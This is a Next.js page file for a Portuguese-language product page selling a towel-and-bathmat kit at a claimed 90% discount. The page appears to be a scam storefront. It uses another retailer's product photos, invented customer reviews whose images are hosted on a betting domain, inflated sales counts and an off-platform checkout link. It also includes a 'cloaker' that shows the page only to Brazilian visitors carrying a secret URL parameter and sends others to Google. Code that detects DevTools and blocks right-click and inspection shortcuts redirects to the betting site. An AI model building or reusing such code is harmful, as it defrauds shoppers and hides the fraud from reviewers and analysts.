// src/app/page.js
'use client'

import { useEffect, useState } from 'react'
import TopBar from '@/components/TopBar'
import ProductCarousel from '@/components/ProductCarousel'
import ProductInfo from '@/components/ProductInfo'
import Reviews from '@/components/Reviews'
import RecommendedProducts from '@/components/RecommendedProducts'
import Footer from '@/components/Footer'

const CLOAKER_CONFIG = {
  enabled: false,
  filters: {
    location: {
      enabled: true,
      apiToken: '8a7c777b62c246e39c6e08de41b457e7',
    },
    parameter: {
      enabled: true,
      name: 'acesso',
      value: 'true'
    }
  },
  redirect: {
    url: 'https://www.google.com',
  },
  loading: {
    time: 2000,
    enabled: true
  }
}

const PROTECTION_CONFIG = {
  enabled: false, // Ativa/desativa todas proteções
  redirectUrl: 'https://lua777bet.online/', // URL para redirecionamento quando detectar DevTools
}

function getProductData() {
  return {
    id: 2,
    name: 'Kit 2 Jogos de Toalha + 1 Tapete Grátis',
    price: 97.00,
    checkoutUrl: 'https://pay.compra-blindada.site/RmA83E5z6yO3PVp',
    oldPrice: 899.99,
    installmentOldPrice: 899.99,
    installmentPrice: 32.33,
    pixPrice: 97.00,
    soldCount: 11.393,
    rating: 5.0,
    promotion: {
      couponsAvailable: 2304,
      discountPercentage: 90,
      showBlackFriday: true
    },
    images: [
      'https://hoomy.com.br/cdn/shop/files/32_2048x2048.jpg?v=1726166294',
      'https://hoomy.com.br/cdn/shop/files/29_2048x2048.jpg?v=1726166294',
      'https://hoomy.com.br/cdn/shop/files/BKL_23-05_Bath_BathMatMacro_White_1x_WOgrey_768x_crop_center_jpg_f3986718-5518-42a4-911d-6e5210ef8df2_2048x2048.jpg?v=1726167533',
      'https://hoomy.com.br/cdn/shop/files/ToalhaPrancheta_10_59a57208-b98a-41d9-ad3c-980f0c9101e5_2048x2048.jpg?v=1726167524',
      'https://hoomy.com.br/cdn/shop/files/ToalhaPrancheta_9_eb5a2f6e-783d-405d-af45-a8c01b18d872_2048x2048.jpg?v=1726167534',
      'https://hoomy.com.br/cdn/shop/files/ToalhaPrancheta_13_a9076948-d2f7-48f1-922f-d2e2d124e327_2048x2048.jpg?v=1726167276',
      'https://hoomy.com.br/cdn/shop/files/ToalhaPrancheta_12_67cfbf5a-3381-4b59-b02d-a8ab188110f0_2048x2048.jpg?v=1726167276',
      'https://hoomy.com.br/cdn/shop/files/ToalhaPrancheta_16_826bdba0-da62-4887-97a5-dad65ed8a147_2048x2048.jpg?v=1726167276',
      'https://hoomy.com.br/cdn/shop/files/ToalhaPrancheta_11_1c640643-8688-4901-9006-9e2b9d9f7153_2048x2048.jpg?v=1726167276',
      'https://hoomy.com.br/cdn/shop/files/bath-mat-graphite_detail_768x_crop_center_jpg_22d79c0d-5029-4cd4-ab52-d9bc76d625ec_2048x2048.jpg?v=1726167523',
      'https://hoomy.com.br/cdn/shop/files/30_2048x2048.jpg?v=1726166294',
      'https://hoomy.com.br/cdn/shop/files/ToalhaPrancheta_9_e23b8813-2e22-45f0-919a-cc4f8d167245_2048x2048.jpg?v=1726167281',
      'https://hoomy.com.br/cdn/shop/files/ToalhaPrancheta_13_5146688b-4bc6-4e21-bc7c-40b310b8a075_2048x2048.jpg?v=1726167533',
      'https://hoomy.com.br/cdn/shop/files/ToalhaPrancheta_13_5146688b-4bc6-4e21-bc7c-40b310b8a075_2048x2048.jpg?v=1726167533',
      'https://hoomy.com.br/cdn/shop/files/31_2048x2048.jpg?v=1726166294',
      'https://hoomy.com.br/cdn/shop/files/ToalhaPrancheta_12_bdca66b9-7e1f-4a5a-af3f-d8e272b2d97a_2048x2048.jpg?v=1726167524',



      'https://hoomy.com.br/cdn/shop/files/ToalhaPrancheta_10_6d8d0dbb-3c2b-4032-b224-6ad953cad64a_2048x2048.jpg?v=1726167276',
      'https://hoomy.com.br/cdn/shop/files/bath-mat-graphite_detail_768x_crop_center_jpg_b8624833-8dc3-4bbb-87cf-af1fefcd65df_2048x2048.jpg?v=1726167443',
      'https://hoomy.com.br/cdn/shop/files/ToalhaPrancheta_16_8f957e5a-2e6d-4b36-a106-cf0d93195467_2048x2048.jpg?v=1726167523',
      'https://hoomy.com.br/cdn/shop/files/35_2048x2048.jpg?v=1731021240',
      'https://hoomy.com.br/cdn/shop/files/2025_f89edd19-869f-4e91-8388-a32560f0b426_2048x2048.jpg?v=1731021240',
      'https://hoomy.com.br/cdn/shop/files/2026_ddb98776-70ff-4d58-901b-3471edc08fba_2048x2048.jpg?v=1731021240',
      'https://hoomy.com.br/cdn/shop/files/2027_2048x2048.jpg?v=1731021241',
      'https://hoomy.com.br/cdn/shop/files/30_2048x2048.jpg?v=1726166294',
      'https://hoomy.com.br/cdn/shop/files/2028_2048x2048.jpg?v=1731021240',
      'https://hoomy.com.br/cdn/shop/files/2029_2048x2048.jpg?v=1731021240',
      'https://hoomy.com.br/cdn/shop/files/2032_2048x2048.jpg?v=1731021241'

    ],
    reviews: [
      {
        id: 1,
        username: 'anazs2',
        avatar: 'https://lua777bet.online/operacoes/shopee-avaliacoes/toalha/mulher1.png',
        rating: 5,
        date: '18/11/2024',
        text: 'Ótima promoção, levei 2 kits',
        images: ['https://lua777bet.online/operacoes/shopee-avaliacoes/toalha/mulher1-foto1.png', 'https://lua777bet.online/operacoes/shopee-avaliacoes/toalha/mulher1-foto1.png'],
        attributes: {
          costBenefit: 'Excelente',
          asAdvertised: 'Sim'
        }
      },
      {
        id: 2,
        username: 'Carol',
        avatar: 'https://lua777bet.online/operacoes/shopee-avaliacoes/toalha/mulher2.png',
        rating: 5,
        date: '17/11/2024',
        text: 'Essa toalha é incrível! Comprei no início do ano e agora vou comprar pra família toda. Sensacional!',
        images: ['https://lua777bet.online/operacoes/shopee-avaliacoes/toalha/mulher2-foto1.png', 'https://lua777bet.online/operacoes/shopee-avaliacoes/toalha/mulher2-foto2.png', 'https://lua777bet.online/operacoes/shopee-avaliacoes/toalha/mulher2-foto3.png'],
        attributes: {
          costBenefit: 'Ótimo',
          asAdvertised: 'Sim'
        }
      },
      {
        id: 3,
        username: 'Mariaaah',
        avatar: 'https://lua777bet.online/operacoes/shopee-avaliacoes/toalha/mulher3.png',
        rating: 5,
        date: '20/11/2024',
        text: 'Ela realmente promete o que entrega. É muito macia e eu pensei que pelo tamanho ela seria super pesada, mas não é. Eu recomendo o produto',
        images: ['https://lua777bet.online/operacoes/shopee-avaliacoes/toalha/mulher3-foto1.png'],
        attributes: {
          costBenefit: 'Excelente',
          asAdvertised: 'Sim'
        }
      }
    ],
    description: {
      text: `Kit 2 Jogos de Toalha + 1 Tapete Grátis

Renove o seu banheiro com praticidade, qualidade e estilo com o Kit 2 Jogos de Toalha + 1 Tapete Grátis. Ideal para quem busca conforto e funcionalidade, este kit é composto por dois jogos completos de toalhas e um tapete extra como brinde, garantindo uma experiência completa para o dia a dia.

As toalhas são confeccionadas com material de alta qualidade, garantindo superabsorção, toque macio e durabilidade. O tapete Hoomy, incluído gratuitamente, oferece maior segurança e conforto ao sair do banho, além de um design moderno que complementa a decoração do ambiente.

O que inclui:
- 2 Jogos de toalha (2 toalhas de banho + 2 toalhas de rosto).
- 1 Tapete grátis.

Características principais:
- Toalhas: Confeccionadas com tecido de alta gramatura, macias e altamente absorventes.
- Tapete: Antiderrapante e resistente, perfeito para maior conforto e segurança.
- Design moderno: Disponível em cores que combinam com qualquer estilo de banheiro.
- Durabilidade: Produtos desenvolvidos para uso frequente sem perder a qualidade.

Transforme seus momentos de autocuidado em uma experiência ainda mais agradável com o Kit 2 Jogos de Toalha + 1 Tapete Grátis. Prático, funcional e perfeito para presentear ou renovar o seu enxoval!`,
      image: 'https://hoomy.com.br/cdn/shop/files/ToalhaPrancheta_10_59a57208-b98a-41d9-ad3c-980f0c9101e5_2048x2048.jpg?v=1726167524'
    },    
    variants: {
      version: {
        show: true,
        title: 'ESCOLHA O MODELO',
        options: [
          '1 Jogo Branco | 1 Jogo Graphite | 1 Tapete Graphite',
          '1 Jogo Branco | 1 Jogo Graphite | 1 Tapete Branco',
          '2 Jogos Brancos | 1 Tapete Branco',
          '2 Jogos Graphite | 1 Tapete Graphite',
          '2 Jogos Ocean Blue | 1 Tapete Branco',
          '2 Jogos Ocean Blue | 1 Tapete Graphite',
          '2 Jogos Light Rose | 1 Tapete Branco',
          '2 Jogos Light Rose | 1 Tapete Graphite',
          '1 Jogo Branco | 1 Jogo Ocean Blue | 1 Tapete Branco',
          '1 Jogo Branco | 1 Jogo Ocean Blue | 1 Tapete Graphite',
          '1 Jogo Branco | 1 Jogo Light Rose | 1 Tapete Branco',
          '1 Jogo Branco | 1 Jogo Light Rose | 1 Tapete Graphite',
          '1 Jogo Graphite | 1 Jogo Ocean Blue | 1 Tapete Branco',
          '1 Jogo Graphite | 1 Jogo Ocean Blue | 1 Tapete Graphite',
          '1 Jogo Graphite | 1 Jogo Light Rose | 1 Tapete Branco',
          '1 Jogo Graphite | 1 Jogo Light Rose | 1 Tapete Graphite',
          '1 Jogo Ocean Blue | 1 Jogo Light Rose | 1 Tapete Branco',
          '1 Jogo Ocean Blue | 1 Jogo Light Rose | 1 Tapete Graphite'
        ]
      },
      capacity: {
        show: false,
        title: 'TAMANHO',
        options: ['Solteiro King', 'Casal', 'Queen','King']
      }
    },
    recommendations: [
      {
        id: 1,
        name: 'Kit 2 Jogos de Toalha + 1 Tapete Grátis',
        image: 'https://hoomy.com.br/cdn/shop/files/ToalhaPrancheta_10_59a57208-b98a-41d9-ad3c-980f0c9101e5_2048x2048.jpg?v=1726167524',
        oldPrice: 899.99,
        price: 97.00,
        discount: 90,
        url: 'https://pay.compra-blindada.site/RmA83E5z6yO3PVp'
      }
    ],
    reviewStats: {
      totalReviews: 1.211,
      averageRating: 5.0,
      tags: [
        { text: 'Amei o produto', count: 187 },
        { text: 'Recomendo', count: 175 },
        { text: 'Entrega rápida', count: 132 }
      ]
    }
  }
}

export default function JogoDeToalha() {
  const [loading, setLoading] = useState(CLOAKER_CONFIG.enabled)
  const [productData, setProductData] = useState(null)

  useEffect(() => {
    if (PROTECTION_CONFIG.enabled) {
      // Função para detectar DevTools
      const detectDevTools = () => {
        const widthThreshold = window.outerWidth - window.innerWidth > 160
        const heightThreshold = window.outerHeight - window.innerHeight > 160
        
        if (widthThreshold || heightThreshold) {
          window.location.href = PROTECTION_CONFIG.redirectUrl
        }
      }

      // Detecta DevTools por diferença de tamanho
      window.addEventListener('resize', detectDevTools)
      setInterval(detectDevTools, 1000)

      // Atalhos do teclado
      document.addEventListener('keydown', (e) => {
        // Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, F12, Ctrl+U
        if (
          (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
          e.key === 'F12' ||
          (e.ctrlKey && e.key === 'U')
        ) {
          e.preventDefault()
          window.location.href = PROTECTION_CONFIG.redirectUrl
        }
      })

      // Desabilita clique direito
      document.addEventListener('contextmenu', e => e.preventDefault())

      // Debug tools detector
      let elemento = new Image()
      Object.defineProperty(elemento, 'id', {
        get: function() {
          window.location.href = PROTECTION_CONFIG.redirectUrl
        }
      })
      
      // Monitora console.log
      const consoleLog = window.console.log
      window.console.log = function() {
        if (arguments[0] === '%c') {
          window.location.href = PROTECTION_CONFIG.redirectUrl
        }
        consoleLog.apply(null, arguments)
      }

      return () => {
        window.removeEventListener('resize', detectDevTools)
        document.removeEventListener('contextmenu', e => e.preventDefault())
      }
    }
  }, [])

  useEffect(() => {
    async function init() {
      if (!CLOAKER_CONFIG.enabled) {
        setProductData(getProductData())
        return
      }

      try {
        let isValid = true

        if (CLOAKER_CONFIG.filters.parameter.enabled) {
          const urlParams = new URLSearchParams(window.location.search)
          const accessParam = urlParams.get(CLOAKER_CONFIG.filters.parameter.name)
          if (accessParam !== CLOAKER_CONFIG.filters.parameter.value) {
            isValid = false
          }
        }

        if (isValid && CLOAKER_CONFIG.filters.location.enabled) {
          try {
            const response = await fetch(`https://api.findip.net/${CLOAKER_CONFIG.filters.location.apiToken}`)
            const data = await response.json()
            const isFromBrazil = data?.country?.iso_code === 'BR'
            if (!isFromBrazil) isValid = false
          } catch (error) {
            console.warn('Erro ao verificar localização:', error)
          }
        }

        if (!isValid) {
          window.location.href = CLOAKER_CONFIG.redirect.url
          return
        }

        if (window.location.search) {
          const newurl = window.location.protocol + "//" + window.location.host + window.location.pathname
          window.history.pushState({ path: newurl }, '', newurl)
        }

        if (CLOAKER_CONFIG.loading.enabled) {
          await new Promise(resolve => setTimeout(resolve, CLOAKER_CONFIG.loading.time))
        }

        setProductData(getProductData())
        setLoading(false)
      } catch (error) {
        console.warn('Erro:', error)
        setProductData(getProductData())
        setLoading(false)
      }
    }

    init()
  }, [])

  if (loading && CLOAKER_CONFIG.enabled) {
    return (
      <div className="loading-container">
        <div className="loading-spinner"></div>
        <span>Carregando...</span>
        <style jsx>{`
          .loading-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: white;
            gap: 12px;
            z-index: 9999;
          }
          .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #EE4D2D;
            border-radius: 50%;
            animation: spin 1s linear infinite;
          }
          .loading-container span {
            color: #666;
            font-size: 14px;
          }
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        `}</style>
      </div>
    )
  }

  if (!productData) return null

  return (
    <main style={{ userSelect: 'none' }}>
      <TopBar promotionData={productData.promotion} />
      <ProductCarousel images={productData.images} />
      <ProductInfo product={productData} />
      <Reviews 
        reviews={productData.reviews} 
        stats={productData.reviewStats}
      />
      <RecommendedProducts products={productData.recommendations} />
      <Footer />
    </main>
  )
}
